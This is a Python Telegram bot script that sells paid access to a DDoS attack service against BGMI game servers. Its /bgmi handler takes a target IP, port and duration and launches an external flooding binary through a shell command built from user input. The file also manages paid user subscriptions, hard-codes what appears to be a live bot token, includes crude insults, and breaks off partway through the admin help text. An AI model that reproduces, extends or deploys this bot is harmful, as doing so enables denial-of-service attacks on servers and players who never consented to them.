#script by @GODxAloneBOY

import telebot
import subprocess
import datetime
import os

from keep_alive import keep_alive
keep_alive()
# insert your Telegram bot token here
bot = telebot.TeleBot('7140094105:AAEbc645NvvWgzZ5SJ3L8xgMv6hByfg2n_4')

# Admin user IDs
admin_id = ["1662672529"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["1549748318"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ‚ùå."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ‚úÖ"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} üëç."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists ü§¶‚Äç‚ôÇÔ∏è."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add üòò."
    else:
        response = "You have not purchased yet purchase now from:- @GODxAloneBOY."

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"üë§ Your Info:\n\nüÜî User ID: <code>{user_id}</code>\nüìù Username: {username}\nüîñ Role: {user_role}\nüìÖ Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n‚è≥ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully üëç."
            else:
                response = f"User {user_to_remove} not found in the list ‚ùå."
        else:
            response = '''Please Specify A User ID to Remove. 
‚úÖ Usage: /remove <userid>'''
    else:
        response = "You have not purchased yet purchase now from:- @GODxAloneBOY üôá."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ‚ùå."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ‚úÖ"
        except FileNotFoundError:
            response = "Logs are already cleared ‚ùå."
    else:
        response = "You have not purchased yet purchase now from :- @GODxAloneBOY ‚ùÑ."
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ‚ùå."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ‚úÖ"
        except FileNotFoundError:
            response = "users are already cleared ‚ùå."
    else:
        response = "Íú∞ Ä·¥á·¥á ·¥ã·¥á ·¥Ö ú·¥Ä Ä·¥ç Íú± ú·¥Ä ü·¥Ä  ú·¥Ä…™ ·¥ã è·¥Ä ·¥ä·¥è ·¥ç·¥ú ·¥ú·¥õ·¥õ ú·¥Ä ·¥ã·¥Ä…™ ·¥ã ú…™  ô ú…™ …¢·¥úÍú±  Ä ú·¥Ä…™  ú·¥è  ô·¥ú è ·¥ã Ä·¥è Íú∞ Ä·¥á·¥á ·¥ç·¥Ä…™ ·¥ã·¥ú·¥Ñ ú …¥ ú…™ ·¥ç…™ ü·¥õ·¥Ä  ô·¥ú è:- @GODxAloneBOY üôá."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ‚ùå"
        except FileNotFoundError:
            response = "No data found ‚ùå"
    else:
        response = "Íú∞ Ä·¥á·¥á ·¥ã·¥á ·¥Ö ú·¥Ä Ä·¥ç Íú± ú·¥Ä ü·¥Ä  ú·¥Ä…™ ·¥ã è·¥Ä ·¥ä·¥è ·¥ç·¥ú ·¥ú·¥õ·¥õ ú·¥Ä ·¥ã·¥Ä…™ ·¥ã ú…™  ô ú…™ …¢·¥úÍú±  Ä ú·¥Ä…™  ú·¥è  ô·¥ú è ·¥ã Ä·¥è Íú∞ Ä·¥á·¥á ·¥ç·¥Ä…™ ·¥ã·¥ú·¥Ñ ú …¥ ú…™ ·¥ç…™ ü·¥õ·¥Ä  ô·¥ú è:- @GODxAloneBOY ‚ùÑ."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ‚ùå."
                bot.reply_to(message, response)
        else:
            response = "No data found ‚ùå"
            bot.reply_to(message, response)
    else:
        response = "Íú∞ Ä·¥á·¥á ·¥ã·¥á ·¥Ö ú·¥Ä Ä·¥ç Íú± ú·¥Ä ü·¥Ä  ú·¥Ä…™ ·¥ã è·¥Ä ·¥ä·¥è ·¥ç·¥ú ·¥ú·¥õ·¥õ ú·¥Ä ·¥ã·¥Ä…™ ·¥ã ú…™  ô ú…™ …¢·¥úÍú±  Ä ú·¥Ä…™  ú·¥è  ô·¥ú è ·¥ã Ä·¥è Íú∞ Ä·¥á·¥á ·¥ç·¥Ä…™ ·¥ã·¥ú·¥Ñ ú …¥ ú…™ ·¥ç…™ ü·¥õ·¥Ä  ô·¥ú è:- @GODxAloneBOY ‚ùÑ."
        bot.reply_to(message, response)


def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    # Changing the font style to a different Unicode font
    response = f"{username}, ùìêùì£ùì£ùìêùìíùìö ùì¢ùì£ùìêùì°ùì£ùìîùìì.üî•üî•\n\nùì£ùì™ùìªùì∞ùìÆùì£: {target}\nùìüùì∏ùìªùì£: {port}\nùì£ùì≤ùì∂ùìÆ: {time} ùì¢ùìÆùì¨ùì∏ùì∑ùì≠ùìº\nùìúùìÆùì£ùìóùìûùìì: VIP- User of @RAJOWNER90"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                time_left = COOLDOWN_TIME - (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
                response = f"‚ö†Ô∏è ùíÄùíêùíñ ùíÇùíìùíÜ ùëúùíè ùíÑùëúùëúùìÅùíπùëúùìåùìÉ ‚ùå. ùí´ùìÅùëíùí∂ùìàùëí ùìåùí∂ùíæùìâ {time_left} ùìàùëíùí∏ùëúùìÉùíπùìà ùí∑ùëíùíªùëúùìáùëí ùìáùìäùìÉùìÉùíæùìÉùëî ùí∂ùí∂ùí∂ùí∂ùí∂ ùí∏ùëúùì∂ùí∂ùíΩùìâ ùì∂ùëíùë†ùìàùí∂ùëîùëí"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            try:
                port = int(command[2])  # Convert port to integer
            except ValueError:
                response = "‚ùå ùìîùìªùìªùì∏ùìª: ùí´ùëúùìáùìâ ùìÇùìäùìàùìâ ùí∑ùëí ùí∂ùìÉ ùíæùìÉùìâùëíùëîùëíùìá."
                bot.reply_to(message, response)
                return

            try:
                time = int(command[3])  # Convert time to integer
            except ValueError:
                response = "‚ùå ùìîùìªùìªùì∏ùìª: ùíØùíæùìÇùëí ùìÇùìäùìàùìâ ùí∑ùëí ùí∂ùìÉ ùíæùìÉùìâùëíùëîùëíùìá."
                bot.reply_to(message, response)
                return

            if port < 1 or port > 65535:
                response = "‚ùå ùìîùìªùìªùì∏ùìª: ùí≤ùíìùëúùìÉùëî ùí´ùìÑùìáùìâ. ùí´ùëúùìáùìâ ùìÇùìäùìàùìâ ùí∑ùëí ùí∑ùëíùìâùìåùëíùëíùìÉ 1 ùí∂ùìÉùíπ 65535."
                bot.reply_to(message, response)
                return

            if time > 120:
                response = "‚ùå ùìîùìªùìªùì∏ùìª: ùíØùíæùìÇùëí ùíæùìÉùìâùëíùìáùìãùí∂ùìÅ ùìÇùìäùìàùìâ ùí∑ùëí ùìÅùëíùìàùìà ùìâùíΩùí∂ùìÉ 120 ùìàùëíùí∏ùëúùìÉùíπùìà."
                bot.reply_to(message, response)
                return

            record_command_logs(user_id, '/raja', target, port, time)
            log_command(user_id, target, port, time)
            start_attack_reply(message, target, port, time)  # Call start_attack_reply function

            full_command = f"./raja {target} {port} {time} 150"
            try:
                process = subprocess.run(full_command, shell=True, check=True)
                response = f"üî• ùìëùìñùìúùìò ùíúùìâùìâùí∂ùí∏ùíΩ ùíªùíæùìÉùíæùìàùíΩùëíùíπ. ùíØùí∂ùìáùëîùëíùìâ: {target} ùí´ùëúùìáùìâ: {port} ùíØùíæùìÇùëí: {time} ùìàùëíùí∏ùëúùëúùìÅ."
            except subprocess.CalledProcessError as e:
                response = f"‚ùå ùìîùìªùìªùì∏ùìª: ùíÆùí∏ùíæùìáùìÖùìâ ùíªùí∂ùíæùìÅùëíùíπ. ùí±ùëíùìáùíæùíªùìé ùìéùëúùìäùìá ùí∏ùëúùìÇùí∂ùìÉùíπ."
            
            bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "‚úÖ ùí≤ùí∂ùìç ùìäùìàùëí: /bgmi <ùìâùí∂ùìáùëîùëíùìâ> <ùí´ùëúùìáùìâ> <ùíØùíæùìÇùëí>"
    else:
        response = ("üö´ ùí∞ùìÉùí∂ùìäùìâùíΩùëúùìáùíæùìèùëíùíπ ùíúùí∏ùí∏ùëíùìàùìà! üö´\n\nùí™ùëúùìÖùìà! ùíæùìâ ùìàùëíùëíùìÇùìà ùìÅùíæùí¶ùëí ùìéùëúùìä ùíπùëúùìÉ'ùìâ ùíΩùí∂ùìãùëí ùìÖùëíùìáùìÇùíæùìàùìàùíæùëúùìÉ ùìâùëú ùìäùìàùëí ùìâùíΩùëí /bgmi ùí∏ùëúùìÇùí∂ùìÉùíπ. ùíüùëÄ ùíØùí™ ùí∑ùìäùìé ùíúùí∏ùí∏ùëíùìàùìà: @GODxAloneBOY")

    bot.reply_to(message, response)


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "‚ùå No Command Logs Found For You ‚ùå."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command üò°."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''ü§ñ ùëâùí∂ùìÅùíæùíπ ùí∏ùëúùìÇùìÇùí∂ùìÉùíπùìà:
üí• /bgmi : ùëÄùëíùìâùíΩùëúùíπ ùêπùëúùìá ùêµùëîùìÇùíæ ùíÆùëíùìáùìãùëíùìáùìà.
üí• /rules : ùí´ùìÅùëíùí∂ùìàùëí ùí∏ùíΩùëíùí∏ùí∏ ùí∑ùëíùíªùëúùìáùëí ùìäùìàùëí !!
üí• /mylogs : ùíØùëú ùíûùíΩùëíùí∏ùìÄ ùí¥ùëúùìäùìá ùëÖùëíùí∏ùëíùìÉùìâ ùíúùìâùìâùí∂ùí∏ùìÄùìà.
üí• /plan : ùê∂ùíΩùëíùí∏ùíΩùëúùìäùìâ ùí™ùìäùìá ùêµùëúùìâùìÉùëíùìâ ùëÖùí∂ùìâùëíùìà.
üí• /myinfo : ùíØùëú ùíûùíΩùëíùí∏ùìÄ ùí¥ùëúùìäùìá ùí≤ùêªùí™ùí≤ùí©ùí≤ùíæùëõùíΩùíæùíø.

ü§ñ ùëáùëú ùíÆùëíùëí ùíúùíπùìÇùíæùìÉ ùí∏ùëúùìÇùìÇùí∂ùìÉùíπùìà:
üí• /admincmd : ùíÆùíΩùëúùìåùìà ùí∂ùìÅùìÅ ùíúùíπùìÇùíæùìÉ ùí∏ùëúùìÇùìÇùí∂ùìÉùíπùìà.

ùêµùìé ùêπùìáùëúùìÇ :- @GODxAloneBOY
Official ùíûùíΩùí∂ùìÉùìÉùëíùìÅ :- https://t.me/+03wLVBPurPk2NWRl
'''

    # Adding command list dynamically with VIP font
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            for command in handler.commands:
                # Make sure it‚Äôs not an admin command if you want to exclude them
                if 'admin' not in handler.__doc__.lower():
                    # Add commands to the help_text with VIP font
                    help_text += f"\nüí• /{command} : {handler.__doc__ or 'No description available'}"

    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''üåü ùëæùë¨ùë≥ùë™ùë∂ùë¥ùë¨ ùëªùë∂ ùí¢ùí™ùíüùí≥ùíûùêªùê∏ùíúùíØùíü ùíüùíüùí™ùíÆ ùí∑ùëúùìâ, {user_name}! üåü

‚ú® ùêñùêû ùêöùê´ùêû ùê°ùêûùê´ùêû ùê≠ùê® ùê©ùê´ùê®ùêØùê¢ùêùùêû ùê≤ùê®ùêÆ ùê∞ùê¢ùê≠ùê° ùê°ùê¢ùê†ùê°-ùê™ùêÆùêöùê•ùê¢ùê≠ùê≤ ùêùùêùùê®ùê¨ ùê¨ùêûùê´ùêØùê¢ùêúùêûùê¨ ùê≠ùê°ùêöùê≠ ùêöùê´ùêû ùê¨ùê≠ùêöùêõùê•ùêû, ùê¨ùêûùêúùêÆùê´ùêû ùêöùêßùêù ùêùùêûùê¨ùê¢ùê†ùêßùêûùêù ùê≠ùê® ùêùùê®ùê¶ùê¢ùêßùêöùê≠ùêû! üí•

üöÄ ùëØùë¨ùëπùë¨'ùë∫ ùëØùë∂ùëæ ùëªùíâùíäùíî ùíÉùíêùíï ùë¥ùë®ùíÄ ùëØùë¨ùëôùë∑ ùíÄùíêùíñ:
1Ô∏è‚É£ ùëªùíìùíö ùíïùíâùíÜ ùíÑùíêùíéùíéùí∂ùëõùíπ /help ùíáùíêùíì ùëé ùíÖùíÜùìâùí∂ùíæùíªùíæùëíùíπ ùíçùíäùìàùíπ ùëúùíª ùí∂ùíªùíªùëúùìáùíπùí∂ùíÉùìÅùëí ùí∏ùëúùìÇùìÇùí∂ùìÉùíπùìà ùìéùëúùìä ùí∏ùí∂ùìÉ ùìäùìàùëí ùìåùíæùìâùíΩ ùìéùëúùìäùìá ùëíùìçùìâùìáùí∂ ùìàùëíùìáùìãùíæùí∏ùëíùìà.

2Ô∏è‚É£ ùë¨ùíèùíãùëúùìé ùëÉùíìùíÜùìÇùíæùìäùìÇ ùíûùëúùìÇùìÇùí∂ùìÉùíπùìà ùí∏ùëúùìÇùëùùìÅùëíùìâùëíùìÅùìé ùíπùëíùìàùíæùëîùìÉùëíùíπ ùíªùëúùìá ùëé ùíÆùìÉùí∂ùìÖ ùëÜùë¢ùí∏ùí∏ùëíùìàùìà ùí∂ùìÉùíπ ùí∂ùíπùíπ ùí∑ùëíùìàùìâ ùìèùíæùìàùìè ùíÆùíæùëçùíµ ùíúùíΩùëíùí∂ùíπ.

üîë ùëπùë¨ùë®ùë´ ùëªùíâùíäùíî: ùëªùíâùíÜ ùíîùíÜùíìùíóùíäùíÑùíÜùìà ùíêùíá ùëÆùí™ùíüùí≥ùíûùêªùê∏ùíúùíØùíü ùí∂ùìáùëí ùëíùìÅùíæùí∂ùí∑ùìÅùëí ùíáùëúùìá ùí∂ ùíπùìéùìÉùí∂ùìÇùíæùí∏ ùí∏ùíæùìâùíæùëíùìà, ùí∑ùìáùíæùíøùìâ ùë†ùëíùí∂ùìÇùëíùìáùìé.

üéØ ùëªùëπùíÄ ùíïùíâùíÜ /help ùíÑùíêùíéùíéùí∂ùëõùíπ ùëìùëúùìá ùìÇùëúùìáùëí ùíÖùíÜùìâùí∂ùíæùìÅùí∂ùíπ ùíªùëíùí∂ùìâùìäùìáùëíùìà.

‚ö° ùë™ùíêùì∂ùëùùìÅùëíùìâùëí ùí∏ùëúùìÇùìÇùí∂ùìÉùíπùìà ùëíùë•ùí∏ùëíùìÅùìÅùëíùìÉùí∏ùëí ùìäùìâùíæùìÅùíæùìèùëíùíπ.

üõí ùêµùìé ùëìùìáùëúùìÇ :- @GODxAloneBOY

üåê ùë∂ùíáùíáùíäùíÑùíäùí∂ùìÅ ùíûùíΩùí∂ùìÉùìÉùëíùìÅ :- https://t.me/+03wLVBPurPk2NWRl
'''

    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ‚ö†Ô∏è:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. MAKE SURE YOU JOINED https://t.me/+03wLVBPurPk2NWRl OTHERWISE NOT WORK
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, laude chutiya
    

__________(‚ñì‚ñì))

_________((‚ñì‚ñì‚ñì))

________(‚ñì‚ñì‚ñì‚ñì‚ñì))

_______(‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì))

_______(‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì))

_______(‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì))

_______(((‚ñì‚ñì‚ñì‚ñì‚ñì))

________((‚ñì‚ñì‚ñì‚ñì))

________(‚ñì‚ñì‚ñì‚ñì)

_______(‚ñì‚ñì‚ñì‚ñì)

______(‚ñì‚ñì‚ñì‚ñì)

_____(‚ñì‚ñì‚ñì‚ñì)

____(‚ñì‚ñì‚ñì‚ñì)

___(‚ñì‚ñì‚ñì‚ñì)

__(‚ñì‚ñì‚ñì‚ñì)

_(‚ñì‚ñì‚ñì‚ñì)

.(‚ñì‚ñì‚ñì‚ñì)

(‚ñì‚ñì‚ñì‚ñì)

(‚ñì‚ñì‚ñì‚ñì)

.(‚ñì‚ñì‚ñì‚ñì)

_(‚ñì‚ñì‚ñì‚ñì)

__(‚ñì‚ñì‚ñì‚ñì)

___(‚ñì‚ñì‚ñì‚ñì)

____(‚ñì‚ñì‚ñì‚ñì)

_____(‚ñì‚ñì‚ñì‚ñì)

______(‚ñì‚ñì‚ñì‚ñì)

_______(‚ñì‚ñì‚ñì‚ñì)

________(‚ñì‚ñì‚ñì‚ñì)

_________(‚ñì‚ñì‚ñì‚ñì)

__________(‚ñì‚ñì‚ñì‚ñì)

___________(‚ñì‚ñì‚ñì‚ñì)

____________(‚ñì‚ñì‚ñì‚ñì)

_____________(‚ñì‚ñì‚ñì‚ñì)

______________(‚ñì‚ñì‚ñì‚ñì)

_______________(‚ñì‚ñì‚ñì‚ñì)

________________(‚ñì‚ñì‚ñì‚ñì)

_________________(‚ñì‚ñì‚ñì‚ñì)

_________________.(‚ñì‚ñì‚ñì‚ñì)

__________________(‚ñì‚ñì‚ñì‚ñì)

__________________(‚ñì‚ñì‚ñì‚ñì)

__________________(‚ñì‚ñì‚ñì‚ñì)

_________________.(‚ñì‚ñì‚ñì‚ñì)

_________________(‚ñì‚ñì‚ñì‚ñì)

________________(‚ñì‚ñì‚ñì‚ñì)

_______________(‚ñì‚ñì‚ñì‚ñì)

______________(‚ñì‚ñì‚ñì‚ñì)

_____________(‚ñì‚ñì‚ñì‚ñì)

TUMKO CHUTIYA BANAYA üòÇ
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''üåü ùëæùë¨ùë≥ùë™ùë∂ùë¥ùë¨, {user_name}! ùíúùíπùìÇùíæùìÉ ùíûùëúùìÇùìÇùí∂ùìÉùíπùìà ùí∂ùìáùëí ùíΩùëíùìáùëí!! üåü

üíº ùëáùíΩùëí ùíªùëúùìÅùìÅùëúùìåùíæùìÉùëî ùí∂ùíπùìÇùíæùìÉ ùí∏ùëúùìÇùìÇùí∂ùìÉùíπùìà ùí∂ùìáùëí ùí∂ùìãùí∂ùíæùìÅùí∂ùí∑ùìÅùëí ùíªùëúùìá ùìéùëúùìä ùìâùëú ùìÇùí∂ùìÄùëí ùí∏ùíΩùí∂ùìÉùëîùëíùìà:

1Ô∏è‚É£ **/add <userId>** 
   - üîë **Usage**: ùí≤ùíæùìâùíΩ ùí∂ùíπùíπùíæùìÉùëî ùí∂ ùìäùìàùëíùìá ùí∑ùìé ùíæùíπ, ùìéùëúùìä ùí∏ùí∂ùìÉ ùëíùìÇùìÖùëúùìåùëíùìá ùìâùíΩùëíùìÇ ùíªùëúùìá ùí∂ùí∏ùí∏ùëíùìàùìà ùí∂ùìÉùíπ ùíΩùíæùëîùíΩ ùíªùìäùìÉùí∏ùìâùíæùëúùìÉùí∂ùìÅùíæùìâùíæùëíùìà.

2Ô∏è‚É£ **/remove <userId>**
   - ‚ùå **Usage**: ùëÖùëíùìÇùëúùìãùëí ùìâùíΩùëí ùìäùìàùëíùìá ùí∑ùìé ùíæùíπ, ùí∂ùìÉùíπ ùìàùíæùìÇùìÖùìÅùíæùíªùìé ùíΩùíæùìà ùí∂ùí∏ùí∏ùëíùìàùìà 
